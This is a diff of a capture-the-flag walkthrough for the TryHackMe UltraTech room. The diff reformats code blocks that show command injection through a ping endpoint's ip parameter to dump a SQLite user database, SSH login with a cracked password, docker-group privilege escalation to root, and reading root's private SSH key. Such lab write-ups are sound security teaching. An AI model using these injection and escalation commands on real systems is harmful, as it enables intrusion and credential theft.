@@ -148,21 +148,25 @@ What if we changed the request to something else? Let's see what happens when we
 ```shell
 http://10.10.39.165:8081/ping?ip=10.10.39.165;ls
 ```
-Hm, nothing happened. Let's try that again with backticks.<br />
+Hm, it didn't work. Let's try that again with backticks.<br />
 ```shell
 http://10.10.39.165:8081/ping?ip=10.10.39.165;`ls`
 ```
 ![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/UltraTech/screenshots/SCREENSHOT13.png?raw=true)<br />
-Success! We were able to list a file "utech.db.sqlite" before we move on, let's have a look at the database file.<br />
+Success! We were able to list a file "utech.db.sqlite", let's have a look at the database file.<br />
+```shell
 http://10.10.39.165:8081/ping?ip=10.10.39.165;`cat utech.db.sqlite`
-Interesting... We've found 2 users along with their password hashes! r00t and admin<br />
+```
+Interesting... We've found 2 users(r00t, admin) along with their password hashes!<br />
 ![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/UltraTech/screenshots/SCREENSHOT15.png?raw=true)<br />
 Let's try to crack the hashes and see what we can do with them! We know the hashes are MD5.<br />
 We've found the password now let's try to login...<br />
 
 ## SSH Service Recon
 We're going to try logging into the SSH service we found earlier.<br />
-```ssh r00t@10.10.39.165```<br />
+```shell
+ssh r00t@10.10.39.165
+```
 ![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/UltraTech/screenshots/SCREENSHOT14.png?raw=true)<br />
 Success! Let's try going into /root and getting the last flag!
 ![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/UltraTech/screenshots/SCREENSHOT16.png?raw=true)<br />
@@ -175,10 +179,14 @@ Interesting, we're apart of the docker group. I may of not noticed this for abou
 Let's try to exploit docker to get root privileges, I first checked https://gtfobins.github.io/gtfobins/docker/<br />
 ![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/UltraTech/screenshots/SCREENSHOT18.png?raw=true)<br />
 Awesome! Let's give the command a try and see if we get root privileges. We first need to change from alpine to bash.<br />
-```docker run -v /:/mnt --rm -it bash chroot /mnt sh```<br />
+```shell
+docker run -v /:/mnt --rm -it bash chroot /mnt sh
+```
 ![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/UltraTech/screenshots/SCREENSHOT19.png?raw=true)<br />
 Success! We're now root, let's get the last flag. We need to find the root users SSH key.<br />
-```cd /root/.ssh && cat id_rsa```<br />
+```shell
+cd /root/.ssh && cat id_rsa
+```
 ![alt text](https://github.com/JcmniaCS/TryHackMe/blob/main/UltraTech/screenshots/SCREENSHOT20.png?raw=true)<br />
 
 ## Questions & Answers
